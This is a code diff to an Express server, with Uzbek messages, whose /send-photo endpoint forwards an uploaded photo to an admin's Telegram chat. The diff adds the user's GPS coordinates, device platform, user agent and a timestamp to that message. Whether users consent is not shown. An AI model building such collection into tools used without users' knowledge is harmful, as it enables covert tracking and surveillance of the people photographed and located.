@@ -1,3 +1,4 @@
+// ✅ server.js
 const express = require("express");
 const path = require("path");
 const multer = require("multer");
@@ -19,7 +20,11 @@ const storage = multer.memoryStorage();
 const upload = multer({ storage });
 
 app.post("/send-photo", upload.single("photo"), async (req, res) => {
-  const { user_id, tg_fullname, tg_username } = req.body;
+  const {
+    user_id, tg_fullname, tg_username,
+    timestamp, latitude, longitude,
+    user_agent, platform
+  } = req.body;
   const fileBuffer = req.file?.buffer;
 
   if (!fileBuffer) return res.status(400).json({ error: "Rasm yo‘q" });
@@ -29,7 +34,17 @@ app.post("/send-photo", upload.single("photo"), async (req, res) => {
 Ism: ${tg_fullname || "Nomaʼlum"}
 Username: @${tg_username || "yo‘q"}
 ID: ${user_id || "nomaʼlum"}
-`.trim();
+
+📍 <b>Joylashuv:</b>
+Latitude: ${latitude || "nomaʼlum"}
+Longitude: ${longitude || "nomaʼlum"}
+
+📱 <b>Qurilma:</b>
+Platforma: ${platform || "nomaʼlum"}
+User-Agent: ${user_agent?.slice(0, 80) || "nomaʼlum"}
+
+🕒 <b>Vaqt:</b> ${timestamp || "nomaʼlum"}
+  `.trim();
 
   const form = new FormData();
   form.append("chat_id", ADMIN_CHAT_ID || user_id);
@@ -44,7 +59,6 @@ ID: ${user_id || "nomaʼlum"}
     await axios.post(TELEGRAM_API, form, {
       headers: form.getHeaders()
     });
-
     console.log("✅ Rasm botga yuborildi");
     res.json({ ok: true });
   } catch (err) {
